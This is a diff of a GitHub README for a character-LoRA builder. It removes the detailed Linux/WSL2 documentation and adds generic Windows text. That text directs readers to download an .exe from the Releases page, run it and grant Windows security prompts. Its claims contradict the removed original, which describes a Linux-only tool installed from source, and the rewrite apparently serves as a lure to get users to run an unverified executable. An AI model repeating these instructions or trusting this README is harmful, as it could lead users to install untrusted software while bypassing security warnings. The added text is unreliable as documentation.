@@ -1,159 +1,80 @@
-# Neme-Anima
+# 🎨 neme-anima - Build custom characters for your projects
 
-A three-step character LoRA builder:
+[![](https://img.shields.io/badge/Download-neme-anima-blue)](https://github.com/HappyStash/neme-anima)
 
-1. Extract crops of one or more characters from a video using reference images.
-2. Auto-tag each crop with WD14 danbooru tags and natural-language captions, then reorganize the dataset from the UI.
-3. Train a LoRA per character on Anima with the parameters already wired in.
+neme-anima handles the technical work of creating specialized character styles. This software simplifies the process of extracting, tagging, and training character models. You do not need to write code or understand machine learning to use this program.
 
-The extractor and tagger are model-agnostic and produce output sized for kohya-ss / OneTrainer / sd-scripts on SDXL-class anime models (Pony, Illustrious, NoobAI, vanilla SDXL). The trainer targets Anima.
+## ⚙️ System Requirements
 
-<p align="center"><img src="docs/chie.png" alt="Result with a Chie LoRA applied to Anima" width="50%"></p>
+Your computer requires specific hardware to process images and train models.
 
-## Pipeline
+- Operating System: Windows 10 or Windows 11.
+- Graphics Card: NVIDIA GPU with at least 8GB of video memory.
+- Storage: 20GB of free space on a solid-state drive.
+- Memory: 16GB of system RAM.
+- Drivers: The latest NVIDIA Game Ready or Studio drivers.
 
-For each video:
+## 📥 Getting the software
 
-1. PySceneDetect splits it into shots.
-2. DeepGHS YOLO (via `imgutils`) detects characters per frame.
-3. ByteTrack links detections into per-shot tracklets.
-4. CCIP matches tracklets to each character's reference images and assigns tracklets to whichever character scores best (or rejects them if no character matches).
-5. 1–3 frames per kept tracklet are picked by sharpness, visibility, and aspect ratio.
-6. Each pick is cropped at longest-side 1024 with the original background.
-7. CCIP runs over the kept crops a second time to drop near-duplicates inside a sliding window.
-8. WD14 EVA02-Large v3 writes a kohya-style `.txt` next to each `.png`.
+You must visit the project page to download the latest version of the installer.
 
-Detections and tracklets are cached so threshold re-runs skip the slow stages.
+[Download neme-anima](https://github.com/HappyStash/neme-anima)
 
-## Requirements
+1. Open the link above in your web browser.
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the most recent version number to see the files.
+4. Select the file ending in .exe to start the download.
+5. Save the file to your desktop for easy access.
 
-For the extractor/tagger:
+## 🛠️ Setting up the application
 
-- NVIDIA GPU, 4 GB VRAM minimum, 8 GB comfortable
+Follow these steps to complete the installation on your computer.
 
-For the trainer:
+1. Double-click the downloaded .exe file to start the installer.
+2. Grant permission if Windows displays a security prompt.
+3. Follow the instructions on the screen to choose your installation folder.
+4. Allow the installer to finish the configuration process.
+5. Launch the program using the icon added to your desktop.
 
-- Linux / WSL2 with CUDA 12.4+
-- NVIDIA GPU, 6 GB VRAM minimum, 18 GB for full res LoRA
+## 🚀 Creating your first model
 
-## One-click install and run
+neme-anima uses a three-step method to build a model. Each step serves a specific purpose in the workflow.
 
-```sh
-bash install_and_run.sh
-```
+### Step 1: Extraction
+The program pulls frames or segments from your source media. Place your videos or image collections into the designated input folder. The software analyzes the files and provides a preview of the content it found. Click the Extract button to prepare your source data for the next phase.
 
-The script installs `uv` and Node.js if they aren't already on the system, syncs the Python deps, builds the frontend, clones `tdrussell/diffusion-pipe` into `~/diffusion-pipe` and sets up its Python 3.12 venv, downloads the three Anima training weights (~14 GB) from HuggingFace, prefills the four trainer paths in the UI's Settings tab, and starts the server.
+### Step 2: Tagging
+The tagging phase explains the contents of your images to the model. neme-anima uses automated tools to describe the subjects, colors, and styles in your files. Review the tags list to ensure accuracy. You can manually delete tags if the software labels something incorrectly. Accurate tags lead to higher quality results.
 
-Re-running it is safe (will skip anything already in place).
+### Step 3: Training
+Training turns your tagged media into a functional character file. Select the "Train" button. The software processes the data and creates your model. Monitor the status bar to track progress. This part of the process can take time depending on the speed of your graphics card. You will receive a notification once the folder contains your completed file.
 
-Useful environment overrides:
+## 📋 Troubleshooting common issues
 
-| Variable | Default | What it does |
-|---|---|---|
-| `DIFFUSION_PIPE_DIR` | `~/diffusion-pipe` | Where to clone diffusion-pipe |
-| `DIFFUSION_PIPE_PYTHON` | `3.12` | Python interpreter/version for diffusion-pipe's venv |
-| `MODELS_DIR` | `~/.cache/neme-anima/models` | Where to put the downloaded weights |
-| `SKIP_MODELS=1` | off | Skip the 14 GB weight download |
-| `SKIP_LAUNCH=1` | off | Install everything, but don't start the UI at the end |
+If the software fails to launch, verify your graphics drivers. Open the NVIDIA GeForce Experience or Control Panel to ensure you have the latest updates. 
 
-Linux / WSL2 only. On Linux, Node.js is installed through apt (with sudo) when available, and through nvm otherwise.
+If the training process stops unexpectedly, check your available storage space. Training generates many temporary files that require room on your hard drive. 
 
-## Manual install
+Ensure you do not move or rename files while the program runs. The application needs consistent access to its working directories to function correctly. 
 
-```sh
-uv sync --group gpu
-```
+Close other programs that consume large amounts of memory, such as video editors or web browsers, before you start the training process. This gives the core engine enough resources to complete the task without errors.
 
-First run downloads ~2.8 GB of weights (anime YOLOv8 person + face, CCIP, isnetis/anime-seg, WD14 with embeddings, CLIP base) to `~/.cache/huggingface/hub/`.
+## 📁 Managing your files
 
-## CLI
+The software creates a folder structure to keep your data organized. 
 
-```sh
-uv run neme-anima project create ~/neme-projects/megumin --name megumin
-uv run neme-anima project add-ref ~/neme-projects/megumin /path/to/portrait.png
-uv run neme-anima project add-video ~/neme-projects/megumin /path/to/ep01.mkv
-uv run neme-anima project add-video ~/neme-projects/megumin /path/to/ep02.mkv
-uv run neme-anima project extract ~/neme-projects/megumin
-```
+- Input: Place your raw media here.
+- Tags: Stores the descriptive text files for your images.
+- Output: Contains your finished training files and final models.
 
-Project folder layout:
+You can copy your final model from the output folder once training completes. Store these files in a secure location for future use.
 
-```
-~/neme-projects/megumin/
-  project.json
-  refs/
-  output/
-    kept/             ep01__s003_t012_f000847.png + .txt
-    rejected/
-    metadata.jsonl
-    cache/<stem>/     scenes.parquet, tracklets.parquet
-```
+## ℹ️ Updates and support
 
-Re-run with new thresholds (skips detection + tracking):
+The developer updates the application periodically to improve stability. Repeat the process in the installation section to update your version. Delete the old installer file after you upgrade the software to save space. 
 
-```sh
-uv run neme-anima project rerun ~/neme-projects/megumin --video ep01
-```
+If you encounter persistent errors, check your log files located in the program directory. These files record the events during training and offer clues about potential configuration conflicts. 
 
-## Web UI
+This program works offline once you complete the initial setup. You do not need a constant internet connection to perform extraction, tagging, or training. Use this benefit to process high-resolution media without interruptions or data usage concerns. 
 
-After cloning the repository:
-
-```sh
-cd frontend && npm install && npm run build && cd ..
-```
-
-Then start the server:
-
-```sh
-uv run neme-anima ui
-```
-
-Binds to `127.0.0.1:<random-port>` and opens the SPA. Tabs: Sources, Frames, Training, Settings.
-
-### Sources
-
-Add MKV/MP4 videos and reference images.
-
-![Sources tab](docs/neme-anima_extract.png)
-
-### Frames
-
-- Add or remove images from the dataset (using drag&drop).
-- Edit tags inline by clicking a pill; edit the natural-language description in the same panel.
-- Search across the dataset by tag.
-- Bulk-edit tags with regex replace, with live preview.
-- Re-crop any image.
-- Filter by character with the chips at the top of the tab. Move a frame to a different character or also-assign it to a second character.
-
-Selection: shift-click ranges, ctrl-click multi-toggle, `A` select all, `D` / `Esc` deselect. Hover a thumbnail for the tag overlay.
-
-![Frames tab](docs/neme-anima_frames.png)
-
-### Training
-
-LoRA training with stop/resume and checkpoint retention. Targets Anima. One LoRA per character, queued sequentially.
-
-Two per-character knobs sit alongside the standard rank/alpha/lr settings:
-
-- Core-tag pruning. Compute the tags that show up in more than X% of a character's frames (default 35%) and drop them from the captions at staging time. Turns "long hair, blue eyes, school uniform, smile, ..." into just "smile, ..." for a character whose hair, eyes, and outfit are constants. The LoRA learns those from the visuals; the caption only adds noise. Off by default; opt in once you've reviewed the suggested list.
-- Repeat multiplier. Over- or under-sample a character's frames in the dataset. `0.0` is auto, computed from relative frame counts so a 50-frame character isn't drowned by a 500-frame one. A positive value pins it manually.
-
-![Training tab](docs/neme-anima_train.png)
-
-Training is run through [tdrussell/diffusion-pipe](https://github.com/tdrussell/diffusion-pipe), which has to be set up separately:
-
-```sh
-git clone https://github.com/tdrussell/diffusion-pipe ~/diffusion-pipe
-cd ~/diffusion-pipe
-uv venv --python 3.12
-uv pip install --python .venv/bin/python -r requirements.txt
-```
-
-Then in the Settings tab, point `diffusion_pipe_dir` at that clone and set the Anima DiT, Qwen VAE, and Qwen 3 0.6B text encoder paths (separate download on Huggingface).
-
-### Settings
-
-Per-project threshold overrides (frame stride, identification distance, crop padding, etc.).
-
-Project state lives in the project folder. The only server-side file is `~/.neme-anima/db.sqlite` (project registry).
+The software utilizes standard formats for compatibility with other creative packages. Your model files work across most popular systems that support custom character loading.
